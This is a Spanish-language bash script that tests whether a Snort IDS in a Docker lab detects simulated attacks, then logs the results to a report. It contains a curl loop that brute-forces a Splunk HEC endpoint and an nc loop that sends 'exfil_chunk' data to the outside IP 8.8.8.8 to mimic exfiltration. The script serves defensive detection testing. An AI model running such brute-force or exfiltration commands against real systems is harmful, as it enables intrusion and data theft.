#!/bin/bash
# =============================================================================
# MARITIME ZTA - PRUEBAS DE INTEGRIDAD Y ABUSO DE PRIVILEGIOS (SOC ADMIN)
# =============================================================================
export MSYS_NO_PATHCONV=1
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; BLUE='\033[0;34m'; CYAN='\033[0;36m'; NC='\033[0m'
REPORT_FILE="resultado_soc_admin_integrity.txt"

echo "=======================================================================" > "$REPORT_FILE"
echo " MARITIME ZTA - REPORTE DE INTEGRIDAD SOC ADMIN" >> "$REPORT_FILE"
echo " Fecha de ejecución: $(date '+%Y-%m-%d %H:%M:%S')" >> "$REPORT_FILE"
echo "=======================================================================" >> "$REPORT_FILE"

header() {
    echo -e "\n${BLUE}════════════════════════════════════════════════════════════${NC}"
    echo -e "${BLUE} $1${NC}"
    echo -e "${BLUE}════════════════════════════════════════════════════════════${NC}"
    echo -e "\n--- $1 ---" >> "$REPORT_FILE"
}

fire_attack() {
    local source_container=$1
    local attack_desc=$2
    local command=$3
    local expected_sid=$4

    local start_time=$(date '+%H:%M:%S')
    echo -e "${YELLOW}► [${start_time}] DESDE [${source_container}]: ${attack_desc}${NC}"

    # Ejecutamos el ataque
    docker exec "$source_container" sh -c "$command" >/dev/null 2>&1 || true
    sleep 3

    local end_time=$(date '+%H:%M:%S')

    if docker exec ids_network_monitor sh -c "grep -E -q ':(${expected_sid}):' /var/log/snort/alert_json.txt 2>/dev/null"; then
        echo -e "${GREEN}   [✔] DETECTADO a las ${end_time} (SID: $expected_sid)${NC}"
        echo "[✔ DETECTADO] $attack_desc (SID: $expected_sid) - Detectado a las $end_time" >> "$REPORT_FILE"
    else
        echo -e "${RED}   [✘] FALLO a las ${end_time} (Snort NO detectó el SID $expected_sid)${NC}"
        echo "[✘ FALLO] $attack_desc (SID: $expected_sid) - Snort ciego" >> "$REPORT_FILE"
    fi
}

docker exec ids_network_monitor sh -c "> /var/log/snort/alert_json.txt"
header "FASE 1: FUERZA BRUTA AL SIEM (CAT 7)"

# SID 1000030: Fuerza bruta a Splunk HEC (10 intentos)
fire_attack "client_soc_admin" "Fuerza Bruta contra Splunk HEC" "for i in \$(seq 1 12); do curl -s --max-time 2 -X POST http://172.20.2.8:8088 >/dev/null & done; wait" "1000030"

header "FASE 2: EXFILTRACIÓN DE DATOS (CAT 5)"

# SID 1000021: Volumen anómalo de datos salientes (Exfiltración)
# Simulamos un flujo constante de datos hacia una IP externa (ej. 8.8.8.8)
fire_attack "client_soc_admin" "Exfiltración: Envío masivo de datos a IP externa" "for i in \$(seq 1 550); do echo 'exfil_chunk' | nc -w 1 8.8.8.8 80 >/dev/null 2>&1 & done; wait" "1000021"

header "REPORTE GENERADO"
echo -e "${GREEN}✔ Reporte guardado en: $(pwd)/${REPORT_FILE}${NC}"
